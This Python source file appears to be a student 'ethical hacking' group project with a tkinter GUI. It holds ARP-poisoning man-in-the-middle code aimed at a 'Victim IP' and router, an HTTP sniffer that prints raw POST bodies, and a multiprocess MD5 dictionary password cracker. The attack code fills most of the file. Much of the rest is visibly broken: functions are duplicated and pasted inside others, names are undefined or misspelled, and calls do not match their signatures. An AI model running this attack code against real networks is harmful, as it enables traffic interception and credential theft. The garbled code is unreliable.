import os, configparser, sys, time, math, hashlib, multiprocessing, argparse
from tkinter import *
from scapy.all import *
import packetsniffer
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
import iface
# Ethical Hacking Python Application

# variable declations
# Elements of the GUI
# GUI Rigging
window = Tk()  # create tkinter GUI object
window.title("Group 1 Final Project")  # Project Title
window.geometry('500x500')  # Set size of the pane

#Label for number of CPU cores
labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
labelNo_Of_CPU.grid(column=2,row=4)

#Entry field for number of CPU cores
textNo_Of_CPU = Entry(window,width=20)
textNo_Of_CPU.grid(column=3,row=4)

# Get the network resource names
#Label for number of CPU cores
labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
labelNo_Of_CPU.grid(column=0,row=3)

#Entry field for number of CPU cores
entryTextNo_Of_CPU = Entry(window,width=20)
entryTextNo_Of_CPU.grid(column=1,row=3)

# Label for chosen interface
labelInterface = Label(window, text="Select Interface")
labelInterface.grid(column=0, row=0)

# Text input for chosen interface
entryTextInterface = Entry(window, width=20)
entryTextInterface.grid(column=1, row=0)

# Label for victim IP input
labelVictimIP = Label(window, text="Victim IP")
labelVictimIP.grid(column=0, row=1)

# Text input for victim IP
entryTextVictimIP = Entry(window, width=20)
entryTextVictimIP.grid(column=1, row=1)

# Label for router IP input
labelRouterIP = Label(window, text="Router IP")
labelRouterIP.grid(column=0, row=2)

# Text Input for router IP
entryTextRouterIP = Entry(window, width=20)
entryTextRouterIP.grid(column=1, row=2)

# function declarations


# MitM Section

try:
	textInterface = input("Enter Interface: ")
	textVictimIP = input("Enter Victim IP: ")
	textRouterIP = input("Enter Router IP: ")
except KeyboardInterrupt:
	print("\n[*] Exiting...")
	sys.exit(1)

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("\n[*] IP Fowarding enabled \n")

# send ARP requests
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2,
    iface = textInterface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


# restore ARP
def restoreARP():
    print("\nRestoring Target")
    victimMAC = get_mac(textVictimIP)
    gatewayMAC = get_mac(textRouterIP)
    send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = "ff:ff:ff:ff:ff:ff",
             hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = "ff:ff:ff:ff:ff:ff",
             hwsrc = gatewayMAC), count = 7)
    print("Disabling IP Forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


# ARP reply, switch
def switch(gatewMAC, vicMAC):
    send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = vicMAC))
    send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = gatewMAC))


# MITM

def mitm():
    try:
        victimMAC = get_mac(textVictimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Victim MAC not found!")
        print("Exiting")
        sys.exit(1)
    try:
        gatewayMAC = get_mac(textRouterIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Gateway MAC not found")
        print("Exiting")
        sys.exit(1)
    print("Poisoning Targets!")
    while 1:
        try:
            switch(gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            restoreARP()
            break



# Packet Sniff
def sniff_packets(iface):
    # Sniff 80 port packets with iface
    if iface:
        # port 80 for http
        sniff(filter="port 80", prn=process_packet, iface=textInterface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)


def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[HTTPRequest].Method.decode()
        print(f"{ip} Requested {url} with {method}{packetsniffer.RESET}")
        if packetsniffer.show_raw and packet.haslayer(Raw) and method == "POST":
            print(f"Some useful Raw data: {packet[Raw].load}{packetsniffer.RESET}")

# this section is normally to call a class containing this code I think, might be wrong
# This can be deleted. It mostly helps with command line arguements.
def sniff_execute():
    # delete the if__name__ section and just throw this all into a function labelled sniffExecute() or soemthing of the like
    # Changed to a functions. But this does not need to be in the code for it to work.
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer")
    parser.add_argument("-i", "--iface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true")
    args = parser.parse_args()
    args.iface
    show_raw = args.show_raw
    sniff_packets(textInterface)

# if packet is successful, get hash as a string and compare it to dictionary
def passwordFiles():
    # create hashes for most common passwords
    # dictionary files
    english_password_list = "10k_most_common.txt"  # input file name
    hashed_words_file = "10k_most_common_hashed.txt"  # output file name
    # hash type
    hash_type = "md5"

def dictionary_attack():

    # create hashes for most common passwords
    # dictionary files
    english_password_list = "10k_most_common.txt"  # input file name
    hashed_words_file = "10k_most_common_hashed.txt"  # output file name
    # hash type
    hash_type = "md5"


    hashesToExport.append(hashOfWord)
    print("Creating hash text file: {} ...".format(output_file_name))

    # foreach word in the file look for the hash types
    for word in input_list:
        if hash_type == "md5":
            crypt = hashlib.md5()
        elif hash_type == "sha1":
            crypt = hashlib.sha1()
            crypt.update(bytes(word, encoding='utf-8'))
            hashOfWord = crypt.hexdigest()

# get the list of words from the file
def list_of_words_from_file(filename):
    print("Opening file: {}".format(filename))
    list_of_words = open(filename, 'r', errors='ignore').readlines()
    print("Stripping breaklines from file: {}".format(filename))
    list_of_words = list(map(str.strip, list_of_words))
    return (list_of_words)

def wordStuff():
    # get words from the file
    words = list_of_words_from_file(english_password_list)
    # create hash
    create_hash_md5_text_file(words, hashed_words_file, hash_type)

# END create hash for common passowords

# START crack passwords
def chunks(LIST, NUMBER_OF_PARTS):
    # For item i in a range that is a length of l,
    for i in range(0, len(LIST), NUMBER_OF_PARTS):
        # Create an index range for l of n items:
        yield LIST[i:i + NUMBER_OF_PARTS]

def passwords():
    # PASSWORDS FROM PACKET WILL NEED TO BE DUMPED INTO A FILE NAMED PASSWORDS_FROM_PACKETS.TXT
    passwords_from_packet = 'passwords_from_packet.txt'

def getCPUNumbers(no_of_cpu):
    no_of_cpu = multiprocessing.cpu_count()

def passwordExecution():
    start = time.perf_counter()

    # OPEN HASHED PASSWORD FILE
    print("Opening file {} ".format(hashed_words_file))
    hashed_password_list = open(passwords_from_packet, 'r').readlines()
    hashed_password_list = list(map(str.strip, hashed_password_list))  # strips away breaklines
    finish = time.perf_counter()

    # OPEN PASSWORDS OBTAINED FROM FROM THE PACKET
    print("Opening file {}".format(passwords_from_packet))
    hashed_words_list = open(passwords_from_packet, 'r').readlines()
    hashed_words_list = list(map(str.strip, hashed_words_list))
    finish = time.perf_counter()

    # SPLIT HASHED PASSWORD FILE
    print("This computer has {0} CPU's, starting splitting of passwords into {0} parts".format(no_of_cpu))
    no_of_elements_in_sublist = math.ceil(len(hashed_password_list) / no_of_cpu)
    chunks_of_password_list = list(chunks(hashed_password_list, no_of_elements_in_sublist))

    # start dictionary attack
    print("Starting dictionary attack on the {} passwords list".format(len(chunks_of_password_list)))

def crack(hashed_password_list, cpu_number):
    number_of_cracked_passwords = 0
    number_of_passwords_scanned = 0

    for hashed_word in hashed_words_list:
        number_of_passwords_scanned += 1
        if hashed_word in hashed_password_list:
            number_of_cracked_passwords += 1
        if number_of_passwords_scanned % 1000 == 0:
            finish = time.perf_counter()
            print("CPU {}: {}/{} password has been cracked. {} minutes elapsed.".format(cpu_number,number_of_cracked_passwords,len(hashed_password_list),round(finish - start) / 60, 2))

# executing codes with multiple cores cpus
def numberOfCPUs(no_of_cpu):
    if no_of_cpu == 2:
        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_list[0], "1"])
        p2 = multiprocessing.process(targer=crack, args=[chunks_of_password_list[0], "1"])

        p1.start()
        p2.start()

        p1.join()
        p2.join()
        print("Cracking has been completed")

    elif no_of_cpu == 4:
        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0], "1"])
        p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1], "2"])
        p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2], "3"])
        p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "4"])

        p1.start()
        p2.start()
        p3.start()
        p4.start()

        p1.join()  # waits until the process is completed
        p2.join()
        p3.join()
        p4.join()
        print("Cracking has been completed")

    elif no_of_cpu == 6:
        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0], "1"])
        p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1], "2"])
        p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2], "3"])
        p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "4"])
        p5 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "5"])
        p6 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "6"])

        p1.start()
        p2.start()
        p3.start()
        p4.start()
        p5.start()
        p6.start()

        p1.join()  # waits until the process is completed
        p2.join()
        p3.join()
        p4.join()
        p5.join()
        p6.join()
        print("Cracking has been completed")

    else:
        print("Error message: You have {} CPU. This code has been constructed for either 2 or 4 CPU.".format(no_of_cpu))
        print(
            "How to fix: Go to line 52-77. I have hardcoded the number of processors to run this. You'll just have to change the if-else statement to cater to your number of cpu.")


    # get the list of words from the file
    def list_of_words_from_file(filename):
        print("Opening file: {}".format(filename))
        list_of_words = open(filename, 'r', errors='ignore').readlines()
        print("Stripping breaklines from file: {}".format(filename))
        list_of_words = list(map(str.strip, list_of_words))
        return (list_of_words)


    # get words from the file
    words = list_of_words_from_file(english_password_list)
    # create hash
    create_hash_md5_text_file(words, hashed_words_file, hash_type)


    # END create hash for common passowords

    # START crack passwords
    def chunks(LIST, NUMBER_OF_PARTS):
        # For item i in a range that is a length of l,
        for i in range(0, len(LIST), NUMBER_OF_PARTS):
            # Create an index range for l of n items:
            yield LIST[i:i + NUMBER_OF_PARTS]


    # PASSWORDS FROM PACKET WILL NEED TO BE DUMPED INTO A FILE NAMED PASSWORDS_FROM_PACKETS.TXT
    passwords_from_packet = 'passwords_from_packet.txt'

    no_of_cpu = multiprocessing.cpu_count()

    start = time.perf_counter()

    # OPEN HASHED PASSWORD FILE
    print("Opening file {} ".format(hashed_words_file))
    hashed_password_list = open(passwords_from_packet, 'r').readlines()
    hashed_password_list = list(map(str.strip, hashed_password_list))  # strips away breaklines
    finish = time.perf_counter()

    # OPEN PASSWORDS OBTAINED FROM FROM THE PACKET
    print("Opening file {}".format(passwords_from_packet))
    hashed_words_list = open(passwords_from_packet, 'r').readlines()
    hashed_words_list = list(map(str.strip, hashed_words_list))
    finish = time.perf_counter()

    # SPLIT HASHED PASSWORD FILE
    print("This computer has {0} CPU's, starting splitting of passwords into {0} parts".format(no_of_cpu))
    no_of_elements_in_sublist = math.ceil(len(hashed_password_list) / no_of_cpu)
    chunks_of_password_list = list(chunks(hashed_password_list, no_of_elements_in_sublist))

    # start dictionary attack
    print("Starting dictionary attack on the {} passwords list".format(len(chunks_of_password_list)))


    def crack(hashed_password_list, cpu_number):
        number_of_cracked_passwords = 0
        number_of_passwords_scanned = 0

        for hashed_word in hashed_words_list:
            number_of_passwords_scanned += 1
            if hashed_word in hashed_password_list:
                number_of_cracked_passwords += 1
            if number_of_passwords_scanned % 1000 == 0:
                finish = time.perf_counter()
                print("CPU {}: {}/{} password has been cracked. {} minutes elapsed.".format(cpu_number,
                                                                                            number_of_cracked_passwords,
                                                                                            len(hashed_password_list),
                                                                                            round(finish - start) / 60, 2))


    # executing codes with multiple cores cpus

    if no_of_cpu == 2:
        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_list[0], "1"])
        p2 = multiprocessing.process(targer=crack, args=[chunks_of_password_list[0], "1"])

        p1.start()
        p2.start()

        p1.join()
        p2.join()
        print("Cracking has been completed")

    elif no_of_cpu == 4:
        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0], "1"])
        p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1], "2"])
        p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2], "3"])
        p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "4"])

        p1.start()
        p2.start()
        p3.start()
        p4.start()

        p1.join()  # waits until the process is completed
        p2.join()
        p3.join()
        p4.join()
        print("Cracking has been completed")

    elif no_of_cpu == 6:
        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0], "1"])
        p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1], "2"])
        p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2], "3"])
        p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "4"])
        p5 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "5"])
        p6 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "6"])

        p1.start()
        p2.start()
        p3.start()
        p4.start()
        p5.start()
        p6.start()

        p1.join()  # waits until the process is completed
        p2.join()
        p3.join()
        p4.join()
        p5.join()
        p6.join()
        print("Cracking has been completed")

    else:
        print("Error message: You have {} CPU. This code has been constructed for either 2,4 or 6 CPU.".format(no_of_cpu))
        print(
            "How to fix: Go to line 52-77. I have hardcoded the number of processors to run this. You'll just have to change the if-else statement to cater to your number of cpu.")

# GUI Buttons
def buttonMitM():
    masterMitMCall(textInterface,textVictimIP,textRouterIP)
    outputText.insert(END,"MitM Engaged\n")
def buttonSniffer():
    masterSnifferCall(textInterface,textVictimIP,textRouterIP)
    outputText.insert(END,"Sniffer Engaged\n")
def buttonPacketProcessor():
    masterPacketProcessorCall(textNo_Of_CPU,textInterface,textVictimIP,textRouterIP)
    outputText.insert(END,"Packet Processor Engaged\n")
def buttonrestoreARP():
    masterRestoreARPCall(textInterface,textVictimIP,textRouterIP)
    outputText.insert(END,"Restore ARP Engaged\n")
def storeVariables():
    textNo_Of_CPU = entryTextNo_Of_CPU.get()
    print(textNo_Of_CPU)
    #store the variable textInterface
    textInterface = entryTextInterface.get()
    print(textInterface)
    #store the variable 
    textVictimIP = entryTextVictimIP.get()
    print(textVictimIP)
    #store the variable textRouterIP
    textRouterIP = entryTextRouterIP.get()
    print(textRouterIP)
    outputText.insert(END,"Input Variables Stored!\n")

# Button for handling mitm() execute call
buttonMitM = Button(window, text="MitM", command=mitm(textVictimIP,textRouterIP))
buttonMitM.grid(column=1, row=4)

# Button for handling sniff_packets() execute call
buttonPacketSniffer = Button(window, text="Engage Packet Sniff", command=buttonSniffer)
buttonPacketSniffer.grid(column=2, row=1)

# button for handling process_packets() call
buttonPacketProcessor = Button(window, text="Engage Packet Processor", command=buttonPacketProcessor)
buttonPacketProcessor.grid(column=2, row=2)

# Button for handling restoreARP() call
buttonRestoreARP = Button(window, text="Restore ARP", command=restoreARP)
buttonRestoreARP.grid(column=2, row=3)

#Create a button to store the variables
buttonStoreVariables = Button(window, text= "Store Variables", command=storeVariables)
buttonStoreVariables.grid(column=2,row=5)
# Button for closing the application
buttonClose = Button(window, text="Quit", command="close")
buttonClose.grid(column=1, row=4)
window.mainloop()  # keeps window open
